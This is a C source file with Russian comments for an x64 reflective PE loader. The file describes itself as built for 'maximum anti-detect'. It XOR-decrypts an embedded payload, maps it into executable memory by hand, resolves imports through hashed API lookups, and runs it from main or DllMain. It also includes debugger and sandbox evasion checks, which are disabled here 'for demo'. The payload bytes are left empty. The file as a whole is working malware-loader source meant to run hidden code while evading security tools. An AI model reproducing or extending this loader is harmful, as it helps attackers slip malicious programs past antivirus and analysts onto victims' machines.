// loader_template_x64.c
// Reflective PE Loader для 64-битных PE-файлов (x64)
// Максимальный антидетект: API hashing, junk-код, анти-анализ, in-memory execution
// Поддержка x64 native PE без временных файлов

#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <signal.h> // Required for signal handling

// Определяем структуры для NtCreateThreadEx
typedef struct _PS_ATTRIBUTE {
    ULONG_PTR Attribute;
    SIZE_T Size;
    union {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

#define PS_ATTRIBUTE_THREAD_CONTEXT 0x00040000

typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PPS_ATTRIBUTE_LIST AttributeList
);

typedef VOID (NTAPI *pRtlInitializeContext)(
    HANDLE Process,
    PCONTEXT Context,
    PVOID Parameter,
    PVOID InitialPc,
    PVOID InitialSp
);

unsigned char ENCRYPTION_KEY[32] = { /* ... */ };
unsigned char PAYLOAD[] = { /* ... */ };
unsigned int PAYLOAD_SIZE = 0;

void log_message(const char* msg) {
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    char* last_slash = strrchr(exe_path, '\\');
    if (last_slash) *(last_slash + 1) = 0;
    char log_path[MAX_PATH];
    sprintf(log_path, "%sloader_debug.txt", exe_path);
    FILE* f = fopen(log_path, "a");
    if (f) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        fprintf(f, "[%04d-%02d-%02d %02d:%02d:%02d] %s\n", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, msg);
        fclose(f);
    }
}

unsigned long hash_api(const char* str) {
    unsigned long hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;
    return hash;
}

FARPROC resolve_api(HMODULE hModule, unsigned long api_hash) {
    if (!hModule) return NULL;
    unsigned char* base = (unsigned char*)hModule;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* names = (DWORD*)(base + exp->AddressOfNames);
    WORD* ordinals = (WORD*)(base + exp->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)(base + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char* name = (const char*)(base + names[i]);
        if (hash_api(name) == api_hash) {
            WORD ord = ordinals[i];
            return (FARPROC)(base + functions[ord]);
        }
    }
    return NULL;
}

typedef HMODULE (WINAPI* pLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID (WINAPI* pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI* pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL (WINAPI* pVirtualFree)(LPVOID, SIZE_T, DWORD);

typedef void (*EntryPoint_t)(void);

HANDLE reflective_load_pe64(unsigned char* pe_data, unsigned int pe_size) {
    log_message("reflective_load_pe64: start");
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    pLoadLibraryA LoadLibraryA_f = (pLoadLibraryA)resolve_api(hKernel32, hash_api("LoadLibraryA"));
    pGetProcAddress GetProcAddress_f = (pGetProcAddress)resolve_api(hKernel32, hash_api("GetProcAddress"));
    pVirtualAlloc VirtualAlloc_f = (pVirtualAlloc)resolve_api(hKernel32, hash_api("VirtualAlloc"));
    pVirtualProtect VirtualProtect_f = (pVirtualProtect)resolve_api(hKernel32, hash_api("VirtualProtect"));
    pVirtualFree VirtualFree_f = (pVirtualFree)resolve_api(hKernel32, hash_api("VirtualFree"));
    
    if (!LoadLibraryA_f || !GetProcAddress_f || !VirtualAlloc_f || !VirtualProtect_f || !VirtualFree_f) {
        log_message("reflective_load_pe64: API resolve failed");
        return NULL;
    }
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe_data;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        log_message("reflective_load_pe64: invalid DOS signature");
        return NULL;
    }
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(pe_data + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        log_message("reflective_load_pe64: invalid NT signature");
        return NULL;
    }
    ULONGLONG image_base = nt->OptionalHeader.ImageBase;
    SIZE_T image_size = nt->OptionalHeader.SizeOfImage;
    LPVOID base = VirtualAlloc_f((LPVOID)image_base, image_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!base) {
        base = VirtualAlloc_f(NULL, image_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    }
    if (!base) {
        log_message("reflective_load_pe64: VirtualAlloc failed");
        return NULL;
    }
    log_message("reflective_load_pe64: memory allocated");
    memcpy(base, pe_data, nt->OptionalHeader.SizeOfHeaders);
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)((BYTE*)nt + sizeof(IMAGE_NT_HEADERS64));
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sections[i].SizeOfRawData > 0) {
            memcpy((BYTE*)base + sections[i].VirtualAddress, pe_data + sections[i].PointerToRawData, sections[i].SizeOfRawData);
        }
    }
    log_message("reflective_load_pe64: sections copied");
    if ((ULONGLONG)base != image_base) {
        ULONGLONG delta = (ULONGLONG)base - image_base;
        IMAGE_DATA_DIRECTORY* reloc_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (reloc_dir->Size > 0) {
            IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)base + reloc_dir->VirtualAddress);
            while (reloc->VirtualAddress) {
                WORD* entries = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
                int count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                for (int i = 0; i < count; i++) {
                    if ((entries[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                        ULONGLONG* addr = (ULONGLONG*)((BYTE*)base + reloc->VirtualAddress + (entries[i] & 0xFFF));
                        *addr += delta;
                    }
                }
                reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
            }
        }
    }
    log_message("reflective_load_pe64: relocations processed");
    IMAGE_DATA_DIRECTORY* import_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (import_dir->Size > 0) {
        IMAGE_IMPORT_DESCRIPTOR* import_desc = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)base + import_dir->VirtualAddress);
        while (import_desc->Name) {
            char* dll_name = (char*)base + import_desc->Name;
            HMODULE dll = LoadLibraryA_f(dll_name);
            if (dll) {
                ULONGLONG* thunk = (ULONGLONG*)((BYTE*)base + import_desc->FirstThunk);
                ULONGLONG* orig_thunk = (ULONGLONG*)((BYTE*)base + import_desc->OriginalFirstThunk);
                while (*thunk) {
                    if (*orig_thunk & IMAGE_ORDINAL_FLAG64) {
                        *thunk = (ULONGLONG)GetProcAddress_f(dll, (LPCSTR)(*orig_thunk & 0xFFFF));
                    } else {
                        IMAGE_IMPORT_BY_NAME* import_name = (IMAGE_IMPORT_BY_NAME*)((BYTE*)base + (*orig_thunk));
                        *thunk = (ULONGLONG)GetProcAddress_f(dll, import_name->Name);
                    }
                    thunk++;
                    orig_thunk++;
                }
            }
            import_desc++;
        }
    }
    log_message("reflective_load_pe64: imports resolved");
    
    // Устанавливаем правильные права доступа для каждой секции
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD protect = PAGE_READWRITE; // По умолчанию
        
        // Определяем права доступа на основе характеристик секции
        if (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (sections[i].Characteristics & IMAGE_SCN_MEM_WRITE)
                protect = PAGE_EXECUTE_READWRITE;
            else
                protect = PAGE_EXECUTE_READ;
        }
        else if (sections[i].Characteristics & IMAGE_SCN_MEM_WRITE)
            protect = PAGE_READWRITE;
        else if (sections[i].Characteristics & IMAGE_SCN_MEM_READ)
            protect = PAGE_READONLY;
            
        DWORD old_protect;
        LPVOID section_addr = (LPVOID)((BYTE*)base + sections[i].VirtualAddress);
        SIZE_T section_size = sections[i].Misc.VirtualSize;
        
        char section_msg[256];
        sprintf(section_msg, "reflective_load_pe64: setting protection for section %d at 0x%p (size: 0x%zx, protect: 0x%x)",
                i, section_addr, section_size, protect);
        log_message(section_msg);
        
        if (!VirtualProtect_f(section_addr, section_size, protect, &old_protect)) {
            char error_msg[256];
            sprintf(error_msg, "reflective_load_pe64: failed to set protection for section %d, error: %lu",
                    i, GetLastError());
            log_message(error_msg);
            return NULL;
        }
    }
    
    log_message("reflective_load_pe64: all sections protected");
    
    // Проверяем и логируем entry point
    ULONGLONG entry_point = (ULONGLONG)base + nt->OptionalHeader.AddressOfEntryPoint;
    char ep_msg[256];
    sprintf(ep_msg, "reflective_load_pe64: entry point at 0x%llx (base: 0x%llx, offset: 0x%x)", 
            entry_point, (ULONGLONG)base, nt->OptionalHeader.AddressOfEntryPoint);
    log_message(ep_msg);
    
    // Проверяем что entry point в пределах загруженной памяти
    if (entry_point < (ULONGLONG)base || entry_point >= ((ULONGLONG)base + nt->OptionalHeader.SizeOfImage)) {
        log_message("reflective_load_pe64: ERROR - entry point outside of loaded image");
        return NULL;
    }
    
    log_message("reflective_load_pe64: entry point validation passed");
    
    // Определяем тип PE (EXE или DLL)
    BOOL is_dll = (nt->FileHeader.Characteristics & IMAGE_FILE_DLL) != 0;
    char type_msg[128];
    sprintf(type_msg, "reflective_load_pe64: file type: %s", is_dll ? "DLL" : "EXE");
    log_message(type_msg);
    
    // Проверяем память entry point
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery((LPVOID)entry_point, &mbi, sizeof(mbi))) {
        char ep_info[256];
        sprintf(ep_info, "reflective_load_pe64: entry point memory info - State: 0x%x, Protect: 0x%x, Type: 0x%x",
                mbi.State, mbi.Protect, mbi.Type);
        log_message(ep_info);
        
        if ((mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE)) == 0) {
            log_message("reflective_load_pe64: ERROR - entry point is not executable!");
            return NULL;
        }
    }
    
    if (is_dll) {
        // Для DLL вызываем DllMain
        typedef BOOL (WINAPI *DllMain_t)(HMODULE, DWORD, LPVOID);
        DllMain_t dll_main = (DllMain_t)entry_point;
        BOOL result = dll_main((HMODULE)base, DLL_PROCESS_ATTACH, NULL);
        if (result) {
            log_message("reflective_load_pe64: DllMain executed successfully");
        } else {
            log_message("reflective_load_pe64: DllMain failed");
        }
    } else {
        log_message("reflective_load_pe64: creating thread for EXE entry point (simple method)");

        LPVOID entry_point_addr = (LPVOID)((ULONGLONG)base + nt->OptionalHeader.AddressOfEntryPoint);

        char ep_msg[256];
        sprintf(ep_msg, "reflective_load_pe64: corrected entry point at 0x%p. Calling directly.", entry_point_addr);
        log_message(ep_msg);

        DWORD thread_id = 0;
        HANDLE hThread = CreateThread(
            NULL,                // Security attributes
            0,                  // Default stack size
            (LPTHREAD_START_ROUTINE)entry_point_addr,
            base,               // Pass the base address as the parameter (hInstance)
            0,                  // Run immediately
            &thread_id          // Thread ID
        );

        if (!hThread) {
            DWORD error = GetLastError();
            char error_msg[128];
            sprintf(error_msg, "reflective_load_pe64: CreateThread failed with error %lu", error);
            log_message(error_msg);
            return NULL;
        }

        char thread_msg[128];
        sprintf(thread_msg, "reflective_load_pe64: thread created successfully, ID: %lu", thread_id);
        log_message(thread_msg);
        
        return hThread;
    }
    
    log_message("reflective_load_pe64: loader completed (but no thread created)");
    return NULL;
}

// Прототипы функций
BOOL check_anti_analysis(void);
BOOL is_x64_pe(BYTE* pe_data);
HANDLE run_payload(unsigned char* payload, unsigned int size, unsigned char* key);
int is_sandbox(void);

// Простая XOR дешифровка для тестирования
void xor_decrypt_payload(BYTE* encrypted_data, SIZE_T encrypted_size, BYTE* key, BYTE* decrypted_data) {
    log_message("xor_decrypt_payload: start");
    
    for (SIZE_T i = 0; i < encrypted_size; i++) {
        decrypted_data[i] = encrypted_data[i] ^ key[i % 32];
    }
    
    // Проверяем первые байты расшифрованных данных
    char debug_msg[256];
    sprintf(debug_msg, "xor_decrypt_payload: first bytes: %02X %02X %02X %02X", 
            decrypted_data[0], decrypted_data[1], decrypted_data[2], decrypted_data[3]);
    log_message(debug_msg);
    
    log_message("xor_decrypt_payload: completed");
}

int is_debugger_present() {
    // Проверка IsDebuggerPresent
    if (IsDebuggerPresent()) return 1;
    
    // Проверка PEB для x64
    #ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);  // x64 использует GS:[0x60]
    #else
    PPEB peb = (PPEB)__readfsdword(0x30);  // x86 использует FS:[0x30]
    #endif
    if (peb->BeingDebugged) return 1;
    
    return 0;
}

BOOL check_anti_analysis(void) {
    if (is_debugger_present()) {
        log_message("check_anti_analysis: debugger detected");
        return FALSE;
    }
    if (is_sandbox()) {
        log_message("check_anti_analysis: sandbox detected");
        return FALSE;
    }
    return TRUE;
}

BOOL is_x64_pe(BYTE* pe_data) {
    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)pe_data;
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)(pe_data + dos_header->e_lfanew);
    return nt_headers->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64;
}

int is_sandbox() {
    // Проверка времени работы системы
    DWORD uptime = GetTickCount();
    if (uptime < 600000) return 1; // < 10 минут
    
    return 0;
}

HANDLE run_payload(unsigned char* payload, unsigned int size, unsigned char* key) {
    log_message("run_payload: start");

    // Проверяем анти-анализ (отключено для демонстрации)
    /*
    if (!check_anti_analysis()) {
        log_message("run_payload: anti-analysis failed");
        return NULL;
    }
    */
    log_message("run_payload: anti-analysis check skipped for demo");

    // Выделяем память для расшифрованных данных
    BYTE* decrypted_data = (BYTE*)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!decrypted_data) {
        log_message("run_payload: failed to allocate memory for decrypted data");
        return NULL;
    }

    // Расшифровываем данные
    xor_decrypt_payload(payload, size, key, decrypted_data);
    log_message("run_payload: payload decrypted");

    HANDLE hThread = NULL;
    // Загружаем PE
    if (is_x64_pe(decrypted_data)) {
        hThread = reflective_load_pe64(decrypted_data, size);
    } else {
        // Загрузка 32-битного PE не реализована в этом шаблоне
        log_message("run_payload: 32-bit PE not supported in x64 loader");
    }

    // НЕ освобождаем память здесь, так как она используется загруженным PE
    // VirtualFree(decrypted_data, 0, MEM_RELEASE);
    log_message("run_payload: end");
    return hThread;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        HANDLE hThread = run_payload(PAYLOAD, PAYLOAD_SIZE, ENCRYPTION_KEY);
        // Для DLL мы не ждем, но закрываем хендл, чтобы избежать утечек
        if(hThread) {
            CloseHandle(hThread);
        }
    }
    return TRUE;
}

int main() {
    HANDLE hThread = run_payload(PAYLOAD, PAYLOAD_SIZE, ENCRYPTION_KEY);
    if (hThread) {
        log_message("main: payload thread created successfully");
        
        // Проверяем состояние потока
        DWORD exit_code;
        if (GetExitCodeThread(hThread, &exit_code)) {
            char debug_msg[256];
            sprintf(debug_msg, "main: thread exit code: %lu", exit_code);
            log_message(debug_msg);
        }
        
        // Для GUI приложений не ждем завершения, просто закрываем хендл
        // GUI приложения работают в бесконечном цикле
        log_message("main: GUI application detected, not waiting for completion");
        CloseHandle(hThread);
        log_message("main: loader completed, GUI application should be running");
    } else {
        log_message("main: failed to create payload thread");
    }
    return 0;
} 